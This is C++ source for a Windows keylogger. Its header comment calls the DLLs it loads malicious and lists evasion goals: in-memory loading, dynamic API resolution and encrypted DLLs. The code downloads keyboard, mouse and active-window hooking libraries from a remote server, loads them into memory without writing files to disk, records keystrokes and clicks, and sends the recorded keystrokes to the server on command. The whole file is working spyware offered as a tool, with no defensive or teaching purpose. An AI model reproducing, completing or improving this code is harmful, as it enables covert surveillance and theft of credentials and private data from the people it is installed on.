//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
/*

    uses the network_lib to send and receive data
    hooks the keyboard and mouse to log keystrokes and mouse clicks
    logs the keystrokes and mouse clicks to a file
    sends the log file to the server when requested

    !! will need the  network_lib.dll and others in the same directory as the executable   !!

    make the malicious dlls to load from memory [done]
    now no files are written to the disk    [done]
    dynamic api resolution [doing]
    use encrypted dlls next
*/

#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <mutex>
#include <vector>
#include "MemoryModule.h"

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPCSTR dllPath_n = "network_lib.dll";
HMEMORYMODULE hDLL_k, hDLL_m, hDLL_w;
HINSTANCE hDLL_n;

//------------------------------------------------------------------------------------------------------------------------------

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

//==============================================================================================================================

typedef void(*InitializeFunc)(std::vector<std::string>*);
typedef void(*CleanupFunc)();
InitializeFunc initialize_active_window, initialize_mouse, initialize_keyboard;
CleanupFunc cleanup_active_window, cleanup_mouse, cleanup_keyboard;

//------------------------------------------------------------------------------------------------------------------------------

bool running = true;
std::vector<std::string> shared_vector;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dlls();
BOOL CtrlHandler(DWORD fdwCtrlType);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char* argv[])
{
    std::atomic<bool> receivedTerminationSignal(false);
    
    if (load_dlls() != 0)return 1;
    //cout << "DLL loaded successfully.\n";

    // Set the console control handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        std::cerr << "Error setting console control handler" << std::endl;
        return 1;
    }


    initialize_active_window(&shared_vector);
    initialize_keyboard(&shared_vector);
    initialize_mouse(&shared_vector);


    std::thread terminationCheckThread([&]()
    {
        while (true)
        {
            std::string a = receive_data("klogger_cmd.txt");
            if (a[0] == 's')
            {
                receivedTerminationSignal = true;
                send_data("klogger_cmd.txt","`");

                std::ostringstream oss;
                for (const auto& entry : shared_vector) oss << entry;
                send_data("key_strokes.txt",oss.str());

                cleanup_keyboard();
                cleanup_mouse();
                cleanup_active_window();
                break; 
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        }
    });
    
    // Main thread continues to process Windows messages
    MSG msg;
    while (!receivedTerminationSignal)
    {
        if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    terminationCheckThread.join();

    FreeLibrary(hDLL_n);
    MemoryFreeLibrary(hDLL_k);
    MemoryFreeLibrary(hDLL_m);
    MemoryFreeLibrary(hDLL_w);

    return 0;
}

int load_dlls()                                             // loads the dlls from the disk
{
    hDLL_n = LoadLibraryA(dllPath_n);
    if (hDLL_n == nullptr)
    {
        std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)GetProcAddress(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)GetProcAddress(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses for network dll.\n";
        FreeLibrary(hDLL_n);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    std::vector<unsigned char> dll_k, dll_m, dll_w;

    dll_k = receive_data_raw("keylog_k_lib.dll");
    dll_m = receive_data_raw("keylog_m_lib.dll");
    dll_w = receive_data_raw("keylog_w_lib.dll");

    //------------------------------------------------------------------------------------------------------------------------------

    hDLL_k = MemoryLoadLibrary(dll_k.data(), dll_k.size());
    if (hDLL_k == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    initialize_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_keyboard = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXXZ");
    if (!initialize_keyboard || !cleanup_keyboard)
    {
        std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
        MemoryFreeLibrary(hDLL_k);
        return 1;
    }

    // //------------------------------------------------------------------------------------------------------------------------------

    hDLL_m = MemoryLoadLibrary(dll_m.data(), dll_m.size());
    if (hDLL_m == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    initialize_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_mouse = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXXZ");
    if (!initialize_mouse || !cleanup_mouse)
    {
        std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
        MemoryFreeLibrary(hDLL_m);
        return 1;
    }

    // //------------------------------------------------------------------------------------------------------------------------------

    hDLL_w = MemoryLoadLibrary(dll_w.data(), dll_w.size());
    if (hDLL_w == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    initialize_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_active_window = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXXZ");
    if (!initialize_active_window || !cleanup_active_window)
    {
        std::cerr << "Failed to get one or more function addresses for initialize_active_window dll.\n";
        MemoryFreeLibrary(hDLL_w);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    return 0;
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
            
            running = false;
            
            cleanup_keyboard();
            cleanup_mouse();
            cleanup_active_window();

            FreeLibrary(hDLL_n);

            MemoryFreeLibrary(hDLL_k);
            MemoryFreeLibrary(hDLL_m);
            MemoryFreeLibrary(hDLL_w);

            return TRUE; // Indicate that the signal was handled
        default:
            return FALSE;
    }
}

